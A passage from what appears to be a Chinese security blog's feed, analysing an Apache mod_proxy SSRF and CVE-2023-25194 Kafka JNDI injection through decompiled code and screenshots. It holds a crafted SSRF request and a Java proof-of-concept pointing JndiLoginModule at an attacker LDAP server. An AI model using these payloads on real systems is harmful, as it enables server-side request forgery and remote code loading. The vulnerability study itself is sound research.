apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br><span class="line">            *url = apr_pstrdup(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">            <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">            memmove(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                    <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                    sockpath, *url, r-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断<code>r-&gt;filename</code>的是否由<code>proxy:</code>开头，接着判断<code>r-&gt;filename</code>的字符串中含有关键字<code>unix:</code>，然后判断<code>unix:</code>后是否含有<code>|</code>。</p><p>若满足条件，则执行apr_uri_parse函数，rv结果为0：</p><p><a href="https://pic.imgdb.cn/item/642c7f0aa682492fcc21c143.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f0aa682492fcc21c143.jpg"></a></p><p>而APR_SUCCESS的值也为0：</p><p><a href="https://pic.imgdb.cn/item/642c7f1aa682492fcc21cfde.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f1aa682492fcc21cfde.jpg"></a></p><p>因此满足<code>rv == APR_SUCCESS</code>，进入if判断。之后将<code>|</code>之后的值赋值给rurl，将<code>unix:</code>后面的内容进行解析，设置成<code>uds_path</code>的值。假设r-&gt;filename为<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code>，那么rurl为<code>http://localhost:8080/</code>，uds_path为<code>/var/run/www.sock</code>。</p><p>假设发送如下请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:/var/run/test.sock|http://localhost:8080/ HTTP/1.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>logs&#x2F;error.log中会出现如下内容：</p><p><a href="https://pic.imgdb.cn/item/642c7f30a682492fcc21e39c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f30a682492fcc21e39c.jpg"></a></p><p>提示我们找不到unix套接字<code>/var/run/test.sock</code>。但是该SSRF是让它把请求发送给<code>|</code>之后的地址，这是怎么做到呢？</p><p>在<code>fix_uds_filename</code>函数中，unix套接字的地址来自于下面这两行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br></pre></td></tr></table></figure><p>若ap_runtime_dir_relative函数返回null，那么后面将会变成普通的TCP连接，如下：</p><p><a href="https://pic.imgdb.cn/item/642c7f42a682492fcc21f4c8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f42a682492fcc21f4c8.jpg"></a></p><p>ap_runtime_dir_relative函数如下所示：</p><p><a href="https://pic.imgdb.cn/item/642c7f50a682492fcc22031f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f50a682492fcc22031f.jpg"></a></p><p>可以看到如果我们使得if中的条件不满足就会返回null，再跟进一下apr_filepath_merge函数，其中有这样一段代码：</p><p><a href="https://pic.imgdb.cn/item/642c7f62a682492fcc221348.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f62a682492fcc221348.jpg"></a></p><p>其中APR_PATH_MAX的定义如下：</p><p><a href="https://pic.imgdb.cn/item/642c7f70a682492fcc222246.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f70a682492fcc222246.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642c7f7da682492fcc222dd4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7f7da682492fcc222dd4.jpg"></a></p><p>因此，如果我们传入的<code>unix:</code>和<code>|</code>之间的内容超过4092，那么apr_filepath_merge函数就会返回APR_ENAMETOOLONG导致ap_runtime_dir_relative函数返回null，从而使得<code>|</code>后的地址被请求，造成SSRF。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-25194 Kafka JNDI Injection</title>
      <link href="/2023/04/04/kafkaJNDI/"/>
      <url>/2023/04/04/kafkaJNDI/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天拜读了4ra1n师傅的<a href="https://articles.zsxq.com/id_52tr00657v3l.html">Kafka Connect RCE 如何检测</a>，感觉很有收获。遂决定对这个漏洞进行分析，了解一下漏洞原理。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>导入依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;sasl.mechanism&quot;</span>,<span class="string">&quot;SCRAM-SHA-256&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;security.protocol&quot;</span>,<span class="string">&quot;SASL_SSL&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;sasl.jaas.config&quot;</span>,<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +</span><br><span class="line">                <span class="string">&quot;required user.provider.url=\&quot;ldap://192.168.135.132:1389/Deserialization/URLDNS/26ed58ce.ipv6.1433.eu.org\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;123123123:123&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">            producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>));</span><br><span class="line">            producer.close();</span><br><span class="line">        &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><a href="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg" title="image-20230403193535399" class="gallery-item"><img src="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg" alt="image-20230403193535399"></a></p><p><a href="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg" title="image-20230403193605628" class="gallery-item"><img src="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg" alt="image-20230403193605628"></a></p><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>首先跟进org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)：</p><p><a href="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg" title="image-20230403193729326" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg" alt="image-20230403193729326"></a></p><p>这里调用了org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)，跟进一下：</p><p><a href="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg" title="image-20230403193814186" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg" alt="image-20230403193814186"></a></p><p>这里首先调用了org.apache.kafka.common.utils.Utils#propsToMap对传入的Properties类型的对象进行了处理，代码如下：</p><p><a href="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg" title="image-20230403193922249" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg" alt="image-20230403193922249"></a></p><p>由名字就可以看出是将Properties类型改为Map类型，得到的结果如下所示：</p><p><a href="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg" title="image-20230403194046786" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg" alt="image-20230403194046786"></a></p><p>接着又将得到的Map类型的对象传入至org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)：</p><p><a href="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg" title="image-20230403194137195" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg" alt="image-20230403194137195"></a></p><p>调用了org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfig：</p><p><a href="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg" title="image-20230403194218342" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg" alt="image-20230403194218342"></a></p><p>其中keySerializer和valueSerializer都为null，因此我们在最开始传入的Properties对象中设置键为key.deserializer和value.serializer的键值对，否则会直接抛出异常。接着又将得到的newConfigs传入org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)：</p><p><a href="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg" title="image-20230403194447403" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg" alt="image-20230403194447403"></a></p><p>最终得到一个ProducerConfig对象，字段情况如下：</p><p><a href="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg" title="image-20230403194657285" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg" alt="image-20230403194657285"></a></p><p>之后又将这些参数传入org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>, org.apache.kafka.clients.producer.internals.ProducerMetadata, org.apache.kafka.clients.KafkaClient, org.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;, org.apache.kafka.common.utils.Time)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.producerConfig = config;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//省略大量代码</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">this</span>.sender = <span class="built_in">this</span>.newSender(logContext, kafkaClient, <span class="built_in">this</span>.metadata);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ioThreadName</span> <span class="operator">=</span> <span class="string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="built_in">this</span>.clientId;</span><br><span class="line">            <span class="built_in">this</span>.ioThread = <span class="keyword">new</span> <span class="title class_">KafkaThread</span>(ioThreadName, <span class="built_in">this</span>.sender, <span class="literal">true</span>);</span><br><span class="line">            <span class="built_in">this</span>.ioThread.start();</span><br><span class="line">            config.logUnused();</span><br><span class="line">            AppInfoParser.registerAppInfo(<span class="string">&quot;kafka.producer&quot;</span>, <span class="built_in">this</span>.clientId, <span class="built_in">this</span>.metrics, time.milliseconds());</span><br><span class="line">            <span class="built_in">this</span>.log.debug(<span class="string">&quot;Kafka producer started&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var24) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close(Duration.ofMillis(<span class="number">0L</span>), <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(<span class="string">&quot;Failed to construct kafka producer&quot;</span>, var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对this.producerConfig进行赋值，还调用了org.apache.kafka.clients.producer.KafkaProducer#newSender方法，这个方法中的参数并不重要，直接看代码：</p><p><a href="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg" title="image-20230403195032610" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg" alt="image-20230403195032610"></a></p><p>可以看到这里调用了org.apache.kafka.clients.ClientUtils#createChannelBuilder方法，继续跟进：</p><p><a href="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg" title="image-20230403195153310" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg" alt="image-20230403195153310"></a></p><p>其中config是this.producerConfig，这里从config中获取到security.protocol以及sasl.mechanism所对应的值并赋值给相应的变量，其中securityProtocol：</p><p><a href="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg" title="image-20230403195334222" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg" alt="image-20230403195334222"></a></p><p>之后又调用了org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder：</p><p><a href="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg" title="image-20230403195429074" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg" alt="image-20230403195429074"></a></p><p>这里判断securityProtocol是否是SASL_PLAINTEXT或SASL_SSL，如果是则进入判断。之后判断contextType是否为空，这个值不为null，clientSaslMechanism的值就是sasl.mechanism对应的值，也就是POC中的SCRAM-SHA-256：</p><p><a href="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg" title="image-20230403195729717" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg" alt="image-20230403195729717"></a></p><p>因此sasl.mechanism的值是必须存在的，否则将抛出异常。之后又调用了org.apache.kafka.common.network.ChannelBuilders#create：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">create</span><span class="params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);</span><br><span class="line">        Object channelBuilder;</span><br><span class="line">        <span class="keyword">switch</span> (securityProtocol) &#123;</span><br><span class="line">            <span class="keyword">case</span> SSL:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SASL_SSL:</span><br><span class="line">            <span class="keyword">case</span> SASL_PLAINTEXT:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sslClientAuthOverride</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                Object jaasContexts;</span><br><span class="line">                <span class="keyword">if</span> (mode != Mode.SERVER) &#123;</span><br><span class="line">                    <span class="type">JaasContext</span> <span class="variable">jaasContext</span> <span class="operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);</span><br><span class="line">                    jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="string">&quot;sasl.enabled.mechanisms&quot;</span>);</span><br><span class="line">                    jaasContexts = <span class="keyword">new</span> <span class="title class_">HashMap</span>(enabledMechanisms.size());</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var18</span> <span class="operator">=</span> enabledMechanisms.iterator();</span><br><span class="line"></span><br><span class="line">                    String listenerClientAuth;</span><br><span class="line">                    <span class="keyword">while</span>(var18.hasNext()) &#123;</span><br><span class="line">                        listenerClientAuth = (String)var18.next();</span><br><span class="line">                        ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (listenerName != <span class="literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">configuredClientAuth</span> <span class="operator">=</span> (String)configs.get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="literal">true</span>).get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (listenerClientAuth == <span class="literal">null</span>) &#123;</span><br><span class="line">                            sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);</span><br><span class="line">                            <span class="keyword">if</span> (configuredClientAuth != <span class="literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;</span><br><span class="line">                                log.warn(<span class="string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PLAINTEXT:</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">PlaintextChannelBuilder</span>(listenerName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ((ChannelBuilder)channelBuilder).configure(configs);</span><br><span class="line">        <span class="keyword">return</span> (ChannelBuilder)channelBuilder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先得到一个Map类型的对象configs，部分键值对是我们在POC中设置好的。之后进行switch语句，若securityProtocol为SASL_SSL或SASL_PLAINTEXT，就会执行如下一行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br></pre></td></tr></table></figure><p>因此channelBuilder是一个SaslChannelBuilder类型的对象，之后退出switch语句，调用了channelBuilder的configure方法，参数为configs。跟进：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> KafkaException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.configs = configs;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="built_in">this</span>.jaasContexts.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">                Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">mechanism</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">                <span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br><span class="line">                <span class="built_in">this</span>.loginManagers.put(mechanism, loginManager);</span><br><span class="line">                <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> loginManager.subject();</span><br><span class="line">                <span class="built_in">this</span>.subjects.put(mechanism, subject);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="string">&quot;GSSAPI&quot;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.maybeAddNativeGssapiCredentials(subject);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                <span class="built_in">this</span>.sslFactory = <span class="keyword">new</span> <span class="title class_">SslFactory</span>(<span class="built_in">this</span>.mode, <span class="built_in">this</span>.sslClientAuthOverride, <span class="built_in">this</span>.isInterBrokerListener);</span><br><span class="line">                <span class="built_in">this</span>.sslFactory.configure(configs);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中this.jaasContexts：</p><p><a href="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg" title="image-20230403200819510" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg" alt="image-20230403200819510"></a></p><p>进入while循环，执行如下一行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br></pre></td></tr></table></figure><p>跟进org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager：</p><p><a href="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg" title="image-20230403201144766" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg" alt="image-20230403201144766"></a></p><p>其中jaasConfigValue的value字段为POC中sasl.jaas.config的值。loginManager为null，调用org.apache.kafka.common.security.authenticator.LoginManager#LoginManager：</p><p><a href="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg" title="image-20230403201458983" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg" alt="image-20230403201458983"></a></p><p>其中loginMetadata的loginClass字段为：</p><p><a href="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg" title="image-20230403201544460" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg" alt="image-20230403201544460"></a></p><p>因此this.login是一个org.apache.kafka.common.security.authenticator.DefaultLogin实例。之后又调用了<code>this.login.login()</code>，跟进org.apache.kafka.common.security.authenticator.AbstractLogin#login：</p><p><a href="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg" title="image-20230403201712476" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg" 